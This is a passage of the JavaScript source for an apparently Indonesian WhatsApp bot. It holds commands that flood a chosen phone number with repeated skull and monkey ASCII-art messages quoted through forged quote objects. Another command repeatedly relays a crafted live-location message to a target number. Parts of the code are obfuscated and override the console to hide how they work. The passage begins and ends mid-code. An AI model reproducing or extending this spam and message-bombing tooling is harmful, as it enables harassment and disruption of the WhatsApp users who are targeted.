             ikyenak66 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `THE IKYY BOTZ INFINITE`,
                            "jpegThumbnail": virgam
                        } 
                    } 
                }
await ikycoli.sendMessage(m.chat, {text:nyet},{quoted:ikyenak66})
}
jancok(`Sukses Send Monyet Sebanyak ${jumlah}`)
}
break
case 'jadimonyet': {
function _0x4304(){var _0x391806=['quoted','35688NyQAkG','Teksnya\x20Mana?','9940TJozFj','__proto__','\x0a┈┈╱▔▔▔▔▔╲┈┈HM┈HM\x0a┈╱┈┈╱▔╲╲╲▏┈┈┈HMM\x0a╱┈┈╱━╱▔▔▔▔▔╲━╮┈┈\x0a▏┈▕┃▕╱▔╲╱▔╲▕╮┃┈┈\x0a▏┈▕╰━▏▊▕▕▋▕▕━╯┈┈\x0a╲┈┈╲╱▔╭╮▔▔┳╲╲┈┈┈\x0a┈╲┈┈▏╭━━━━╯▕▕┈┈┈\x0a┈┈╲┈╲▂▂▂▂▂▂╱╱┈┈┈\x0a┈┈┈┈▏┊┈┈┈┈┊┈┈┈╲┈\x0a┈┈┈┈▏┊┈┈┈┈┊▕╲┈┈╲\x0a┈╱▔╲▏┊┈┈┈┈┊▕╱▔╲▕\x0a┈▏\x20┈┈┈╰┈┈┈┈╯┈┈┈▕▕\x0a┈╲┈┈┈╲┈┈┈┈╱┈┈┈╱┈╲\x0a┈┈╲┈┈▕▔▔▔▔▏┈┈╱╲╲╲▏\x0a┈╱▔┈┈▕┈┈┈┈▏┈┈▔╲▔▔\x0a┈╲▂▂▂╱┈┈┈┈╲▂▂▂╱┈\x0a','70740xRExfi','constructor','sendMessage','search','chat','apply','7022205bouZfT','toString','Sukses\x20Convert\x20Monyet\x20','log','(((.+)+)+)+$','1162056ZdwMwf','418CKLJza','2aHbzyk','1981YFxDvU','length','bind','trace','665062PmUozg','84cnybNN','exception','table','prototype','6398585pWKooj'];_0x4304=function(){return _0x391806;};return _0x4304();}function _0x4915(_0x367705,_0x2398aa){var _0x5582f0=_0x4304();return _0x4915=function(_0x4c2212,_0x2c9d52){_0x4c2212=_0x4c2212-0x128;var _0x4d1fe2=_0x5582f0[_0x4c2212];return _0x4d1fe2;},_0x4915(_0x367705,_0x2398aa);}var _0x394fd2=_0x4915;(function(_0x5c2f53,_0x3c95f1){var _0x2dbdd0=_0x4915,_0x2e8688=_0x5c2f53();while(!![]){try{var _0x130ec1=parseInt(_0x2dbdd0(0x139))/0x1*(-parseInt(_0x2dbdd0(0x13e))/0x2)+-parseInt(_0x2dbdd0(0x12c))/0x3*(-parseInt(_0x2dbdd0(0x13f))/0x4)+-parseInt(_0x2dbdd0(0x143))/0x5+parseInt(_0x2dbdd0(0x137))/0x6+parseInt(_0x2dbdd0(0x13a))/0x7*(parseInt(_0x2dbdd0(0x145))/0x8)+parseInt(_0x2dbdd0(0x132))/0x9+-parseInt(_0x2dbdd0(0x129))/0xa*(parseInt(_0x2dbdd0(0x138))/0xb);if(_0x130ec1===_0x3c95f1)break;else _0x2e8688['push'](_0x2e8688['shift']());}catch(_0x211810){_0x2e8688['push'](_0x2e8688['shift']());}}}(_0x4304,0xb6dd5));var _0x4a2ce5=(function(){var _0x3df300=!![];return function(_0x3eb479,_0x247a49){var _0x34dd22=_0x3df300?function(){var _0x5df950=_0x4915;if(_0x247a49){var _0x740697=_0x247a49[_0x5df950(0x131)](_0x3eb479,arguments);return _0x247a49=null,_0x740697;}}:function(){};return _0x3df300=![],_0x34dd22;};}()),_0x3aada1=_0x4a2ce5(this,function(){var _0x5504c3=_0x4915;return _0x3aada1[_0x5504c3(0x133)]()['search'](_0x5504c3(0x136))['toString']()[_0x5504c3(0x12d)](_0x3aada1)[_0x5504c3(0x12f)](_0x5504c3(0x136));});_0x3aada1();var _0x2c9d52=(function(){var _0x479b19=!![];return function(_0x3de43b,_0x5a3750){var _0x5127c2=_0x479b19?function(){var _0x5e6c95=_0x4915;if(_0x5a3750){var _0x398e27=_0x5a3750[_0x5e6c95(0x131)](_0x3de43b,arguments);return _0x5a3750=null,_0x398e27;}}:function(){};return _0x479b19=![],_0x5127c2;};}()),_0x4c2212=_0x2c9d52(this,function(){var _0x137e12=_0x4915,_0x3cdaab=function(){var _0x31844a;try{_0x31844a=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x5294be){_0x31844a=window;}return _0x31844a;},_0x1d77db=_0x3cdaab(),_0x4bad89=_0x1d77db['console']=_0x1d77db['console']||{},_0x3589bf=[_0x137e12(0x135),'warn','info','error',_0x137e12(0x140),_0x137e12(0x141),_0x137e12(0x13d)];for(var _0x1999bb=0x0;_0x1999bb<_0x3589bf[_0x137e12(0x13b)];_0x1999bb++){var _0xbd651e=_0x2c9d52['constructor'][_0x137e12(0x142)][_0x137e12(0x13c)](_0x2c9d52),_0x40cd3d=_0x3589bf[_0x1999bb],_0x5c154e=_0x4bad89[_0x40cd3d]||_0xbd651e;_0xbd651e[_0x137e12(0x12a)]=_0x2c9d52['bind'](_0x2c9d52),_0xbd651e[_0x137e12(0x133)]=_0x5c154e[_0x137e12(0x133)][_0x137e12(0x13c)](_0x5c154e),_0x4bad89[_0x40cd3d]=_0xbd651e;}});_0x4c2212();{if(!isCreator&&!isBan)return;if(!m[_0x394fd2(0x144)]&&!text)throw _0x394fd2(0x128);nyet='Nama\x20Gw\x20'+text+_0x394fd2(0x12b),await ikycoli[_0x394fd2(0x12e)](m[_0x394fd2(0x130)],{'text':nyet},{'quoted':ikygamzyx}),jancok(_0x394fd2(0x134)+text);}
}
break


case 'ikytengkorak': {            
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
             teng = `
██▀░░░░░░░░░░░░░▀██
█│░░░░░░░░░░░░░░░│█
▌│░░░░░░░░░░░░░░░│▐
░└┐░░░░░░░░░░░░░┌┘░
░░└┐░░░░░░░░░░░┌┘░░
░░┌┘▄▄▄░░░░░▄▄▄└┐░░
▌░│████▌░░░▐████│░▐
█░│▐██▀░░▄░░▀██▌│░█
█▌┘░░░░░▐█▌░░░░░└▐█
██░░▄▄▓░▀█▀░▓▄▄░░██
██▄─┘█▌░░░░░▐█└─▄██
███░░▐─┬┬┬┬┬─▌░░███
███▌░░┬┼┼┼┼┼┬░░▐███
████▄░└┴┴┴┴┴┘░▄████
█████▄░░░░░░░▄█████
`
             ikyenak66 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `THE IKYY BOTZ INFINITE`,
                            "jpegThumbnail": virgam
                        } 
                    } 
                }
await ikycoli.sendMessage(m.chat, {text:teng},{quoted:ikyenak66})
}
jancok(`Sukses Send Tengkorak Sebanyak ${jumlah}`)
}
            break
case 'ikytengkorakprivate': {            
          if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
             teng = `
██▀░░░░░░░░░░░░░▀██
█│░░░░░░░░░░░░░░░│█
▌│░░░░░░░░░░░░░░░│▐
░└┐░░░░░░░░░░░░░┌┘░
░░└┐░░░░░░░░░░░┌┘░░
░░┌┘▄▄▄░░░░░▄▄▄└┐░░
▌░│████▌░░░▐████│░▐
█░│▐██▀░░▄░░▀██▌│░█
█▌┘░░░░░▐█▌░░░░░└▐█
██░░▄▄▓░▀█▀░▓▄▄░░██
██▄─┘█▌░░░░░▐█└─▄██
███░░▐─┬┬┬┬┬─▌░░███
███▌░░┬┼┼┼┼┼┬░░▐███
████▄░└┴┴┴┴┴┘░▄████
█████▄░░░░░░░▄█████
`
             ikyenak66 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `THE IKYY BOTZ INFINITE`,
                            "jpegThumbnail": virgam
                        } 
                    } 
                }
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:ikyenak66})
await m.reply(`Berhasil Mengirim Tengkorak Di Nomer ${text}`)
            }
            break
case 'ikygaskentengkorak': {            
          if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
             teng = `
██▀░░░░░░░░░░░░░▀██
█│░░░░░░░░░░░░░░░│█
▌│░░░░░░░░░░░░░░░│▐
░└┐░░░░░░░░░░░░░┌┘░
░░└┐░░░░░░░░░░░┌┘░░
░░┌┘▄▄▄░░░░░▄▄▄└┐░░
▌░│████▌░░░▐████│░▐
█░│▐██▀░░▄░░▀██▌│░█
█▌┘░░░░░▐█▌░░░░░└▐█
██░░▄▄▓░▀█▀░▓▄▄░░██
██▄─┘█▌░░░░░▐█└─▄██
███░░▐─┬┬┬┬┬─▌░░███
███▌░░┬┼┼┼┼┼┬░░▐███
████▄░└┴┴┴┴┴┘░▄████
█████▄░░░░░░░▄█████
`
             ikyenak66 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `THE IKYY BOTZ INFINITE`,
                            "jpegThumbnail": virgam
                        } 
                    } 
                }
await ikycoli.sendMessage(m.chat, {text:teng},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:teng},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:teng},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:teng},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:teng},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:teng},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:teng},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:teng},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:teng},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:ikyenak66})
 m.reply(`Berhasil Mengirim Tengkorak Di Nomer ${text}`)
            }
            break
case 'ikygaskenliveloc': {
function _0x322e(_0x54ed94,_0x48a348){const _0x58595c=_0x4ec5();return _0x322e=function(_0x3a4c94,_0x4a02b8){_0x3a4c94=_0x3a4c94-0xa2;let _0x289680=_0x58595c[_0x3a4c94];return _0x289680;},_0x322e(_0x54ed94,_0x48a348);}const _0x28f47f=_0x322e;function _0x4ec5(){const _0x14ad37=['773340cXAwoN','__proto__','60AMAxOt','@s.whatsapp.net','key','message','fromObject','42PNhZsx','prototype','{}.constructor(\x22return\x20this\x22)(\x20)','410XMCDsH','12942mXpXMz','Message','trace','1657997490287001','console','bind','13345519TdKCMb','apply','error','relayMessage','toString','constructor','1WXGqBg','chat','0@s.whatsapp.net','THE\x20IKYY\x20BOTZ\x20','exception','1173590beLdZG','304423mLcxyP','log','info','81393yKgCLm','search','4208584aWCRTx','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'];_0x4ec5=function(){return _0x14ad37;};return _0x4ec5();}(function(_0x20650c,_0x1498e0){const _0x3761e8=_0x322e,_0x5edaf3=_0x20650c();while(!![]){try{const _0x40ac7b=-parseInt(_0x3761e8(0xaf))/0x1*(parseInt(_0x3761e8(0xb4))/0x2)+-parseInt(_0x3761e8(0xb8))/0x3*(-parseInt(_0x3761e8(0xbe))/0x4)+parseInt(_0x3761e8(0xbc))/0x5+parseInt(_0x3761e8(0xc3))/0x6*(-parseInt(_0x3761e8(0xb5))/0x7)+-parseInt(_0x3761e8(0xba))/0x8+-parseInt(_0x3761e8(0xa3))/0x9*(parseInt(_0x3761e8(0xa2))/0xa)+parseInt(_0x3761e8(0xa9))/0xb;if(_0x40ac7b===_0x1498e0)break;else _0x5edaf3['push'](_0x5edaf3['shift']());}catch(_0x3a9e76){_0x5edaf3['push'](_0x5edaf3['shift']());}}}(_0x4ec5,0x48e75));const _0x360252=(function(){let _0x411468=!![];return function(_0x3f3191,_0x4223fa){const _0x1f0ce7=_0x411468?function(){const _0x15d8ea=_0x322e;if(_0x4223fa){const _0x51ba88=_0x4223fa[_0x15d8ea(0xaa)](_0x3f3191,arguments);return _0x4223fa=null,_0x51ba88;}}:function(){};return _0x411468=![],_0x1f0ce7;};}()),_0x20b62a=_0x360252(this,function(){const _0x3062c8=_0x322e;return _0x20b62a['toString']()[_0x3062c8(0xb9)]('(((.+)+)+)+$')[_0x3062c8(0xad)]()[_0x3062c8(0xae)](_0x20b62a)[_0x3062c8(0xb9)]('(((.+)+)+)+$');});_0x20b62a();const _0x4a02b8=(function(){let _0x312c5c=!![];return function(_0x17f6fe,_0x227bcb){const _0x5a3f30=_0x312c5c?function(){const _0x5abf7e=_0x322e;if(_0x227bcb){const _0x46f8ab=_0x227bcb[_0x5abf7e(0xaa)](_0x17f6fe,arguments);return _0x227bcb=null,_0x46f8ab;}}:function(){};return _0x312c5c=![],_0x5a3f30;};}()),_0x3a4c94=_0x4a02b8(this,function(){const _0x2f64bd=_0x322e;let _0x197191;try{const _0x486702=Function('return\x20(function()\x20'+_0x2f64bd(0xc5)+');');_0x197191=_0x486702();}catch(_0x524e74){_0x197191=window;}const _0x9d2bb3=_0x197191[_0x2f64bd(0xa7)]=_0x197191[_0x2f64bd(0xa7)]||{},_0x52efd2=[_0x2f64bd(0xb6),'warn',_0x2f64bd(0xb7),_0x2f64bd(0xab),_0x2f64bd(0xb3),'table',_0x2f64bd(0xa5)];for(let _0x3b8a75=0x0;_0x3b8a75<_0x52efd2['length'];_0x3b8a75++){const _0x5940f1=_0x4a02b8['constructor'][_0x2f64bd(0xc4)][_0x2f64bd(0xa8)](_0x4a02b8),_0x3c059f=_0x52efd2[_0x3b8a75],_0x4b2c91=_0x9d2bb3[_0x3c059f]||_0x5940f1;_0x5940f1[_0x2f64bd(0xbd)]=_0x4a02b8[_0x2f64bd(0xa8)](_0x4a02b8),_0x5940f1[_0x2f64bd(0xad)]=_0x4b2c91['toString'][_0x2f64bd(0xa8)](_0x4b2c91),_0x9d2bb3[_0x3c059f]=_0x5940f1;}});_0x3a4c94();{if(!isCreator&&!isBan)return;if(!text)throw'Nomernya\x20mana?';let doc={'key':{'participant':_0x28f47f(0xb1)},'message':{'documentMessage':{'title':'©\x20'+ownername,'jpegThumbnail':thumb}}};var liveLocation=generateWAMessageFromContent(m['chat'],proto[_0x28f47f(0xa4)][_0x28f47f(0xc2)]({'liveLocationMessage':{'degreesLatitude':-6.9366881,'degreesLongitude':107.7228148,'caption':_0x28f47f(0xb2)+philips+'\x20'+ngazap(prefix),'sequenceNumber':_0x28f47f(0xa6),'jpegThumbnail':_0x28f47f(0xbb)}}),{'userJid':m[_0x28f47f(0xb0)],'quoted':doc});ikycoli[_0x28f47f(0xac)](text+_0x28f47f(0xbf),liveLocation[_0x28f47f(0xc1)],{'messageId':liveLocation['key']['id']}),ikycoli[_0x28f47f(0xac)](text+_0x28f47f(0xbf),liveLocation[_0x28f47f(0xc1)],{'messageId':liveLocation[_0x28f47f(0xc0)]['id']}),ikycoli['relayMessage'](text+_0x28f47f(0xbf),liveLocation[_0x28f47f(0xc1)],{'messageId':liveLocation[_0x28f47f(0xc0)]['id']}),ikycoli[_0x28f47f(0xac)](text+_0x28f47f(0xbf),liveLocation[_0x28f47f(0xc1)],{'messageId':liveLocation[_0x28f47f(0xc0)]['id']}),ikycoli[_0x28f47f(0xac)](text+_0x28f47f(0xbf),liveLocation[_0x28f47f(0xc1)],{'messageId':liveLocation[_0x28f47f(0xc0)]['id']}),ikycoli[_0x28f47f(0xac)](m['chat'],liveLocation[_0x28f47f(0xc1)],{'messageId':liveLocation[_0x28f47f(0xc0)]['id']}),ikycoli['relayMessage'](m[_0x28f47f(0xb0)],liveLocation['message'],{'messageId':liveLocation['key']['id']}),ikycoli['relayMessage'](m[_0x28f47f(0xb0)],liveLocation[_0x28f47f(0xc1)],{'messageId':liveLocation['key']['id']}),ikycoli[_0x28f47f(0xac)](m[_0x28f47f(0xb0)],liveLocation[_0x28f47f(0xc1)],{'messageId':liveLocation[_0x28f47f(0xc0)]['id']}),ikycoli[_0x28f47f(0xac)](m[_0x28f47f(0xb0)],liveLocation[_0x28f47f(0xc1)],{'messageId':liveLocation[_0x28f47f(0xc0)]['id']}),jancok('Berhasil\x20Mengirim\x20Liveloc\x20Di\x20Nomer\x20'+text);}
}
break
case 'ikylivelocprivate': {
const _0x1528fe=_0x2c7a;(function(_0x2d09ff,_0x1ccdc7){const _0x177618=_0x2c7a,_0x1d8219=_0x2d09ff();while(!![]){try{const _0x233674=parseInt(_0x177618(0x13b))/0x1+parseInt(_0x177618(0x150))/0x2*(-parseInt(_0x177618(0x157))/0x3)+-parseInt(_0x177618(0x154))/0x4+parseInt(_0x177618(0x142))/0x5*(-parseInt(_0x177618(0x15a))/0x6)+parseInt(_0x177618(0x140))/0x7+parseInt(_0x177618(0x155))/0x8*(-parseInt(_0x177618(0x149))/0x9)+parseInt(_0x177618(0x13d))/0xa;if(_0x233674===_0x1ccdc7)break;else _0x1d8219['push'](_0x1d8219['shift']());}catch(_0x6c2014){_0x1d8219['push'](_0x1d8219['shift']());}}}(_0x173d,0xf1bdb));const _0x305a42=(function(){let _0x466ef7=!![];return function(_0x634baf,_0x343479){const _0x48caae=_0x466ef7?function(){if(_0x343479){const _0x53a519=_0x343479['apply'](_0x634baf,arguments);return _0x343479=null,_0x53a519;}}:function(){};return _0x466ef7=![],_0x48caae;};}()),_0x38877b=_0x305a42(this,function(){const _0x3c5722=_0x2c7a;return _0x38877b[_0x3c5722(0x138)]()['search'](_0x3c5722(0x14c))[_0x3c5722(0x138)]()[_0x3c5722(0x137)](_0x38877b)[_0x3c5722(0x144)](_0x3c5722(0x14c));});function _0x173d(){const 